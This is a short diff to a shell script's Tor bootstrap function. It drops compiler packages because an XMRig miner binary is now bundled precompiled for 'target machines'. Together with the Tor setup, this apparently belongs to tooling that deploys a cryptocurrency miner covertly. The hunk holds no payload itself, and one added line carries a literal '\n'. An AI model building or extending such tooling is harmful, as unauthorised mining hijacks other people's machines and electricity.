@@ -18,9 +18,9 @@ bootstrap_tor() {
     fi
   fi
 
-  # Install the remaining runtime/download tools only after Tor is present.
+  # Install the remaining runtime/download tools only after Tor is present.\n  # The XMRig binary is precompiled and bundled; target machines need no compiler.
   # Prefer cached indexes; refresh and retry only if the package install needs it.
-  local packages=(curl python3 tar gzip ca-certificates git build-essential cmake libuv1-dev libhwloc-dev)
+  local packages=(curl python3 tar gzip ca-certificates)
   local missing=()
   for package in "${packages[@]}"; do
     status=$(dpkg-query -W -f='${db:Status-Status}' "$package" 2>/dev/null || true)
